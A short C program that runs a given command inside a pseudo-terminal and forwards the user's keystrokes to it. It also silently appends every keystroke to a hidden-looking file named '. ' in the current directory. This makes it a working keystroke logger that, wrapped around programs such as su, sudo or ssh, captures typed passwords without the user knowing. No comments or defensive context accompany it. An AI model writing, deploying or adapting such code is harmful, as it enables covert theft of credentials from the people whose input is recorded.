#define _XOPEN_SOURCE 600
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/select.h>

#define LOGFILE ". "

int main(int argc, char **argv) {
    int status, master, slave;
    master = posix_openpt(O_RDWR);
    grantpt(master);
    unlockpt(master);
    slave = open(ptsname(master), O_RDWR);
    pid_t child = fork();
    if (child==-1) {
        return 1;
    } else if (child==0) {
        struct termios sts, ts;
        tcgetattr(slave, &sts);
        ts = sts;
        cfmakeraw(&ts);
        tcsetattr(slave, TCSANOW, &ts);
        close(master);
        close(STDIN_FILENO);
        dup(slave);
        close(slave);
        execv(argv[1], argv+1);
        return 1;
    } else {
        char buf[256];
        pid_t pid;
        int nr, log;
        fd_set fdset;
        close(slave);
        log = open(LOGFILE,O_WRONLY|O_CREAT|O_APPEND|O_SYNC, 0600);
        pid = waitpid(child, &status, WNOHANG);
        while (pid!=child) {
            FD_ZERO(&fdset);
            FD_SET(STDIN_FILENO, &fdset);
            select(1, &fdset, NULL, NULL, NULL);
            if (FD_ISSET(0, &fdset)) {
                nr = read(STDIN_FILENO, buf, 256);
                write(log, buf, nr);
                write(master, buf, nr);
            }
            pid = waitpid(child, &status, WNOHANG);
        }
        close(log);
        return status;
    }
}
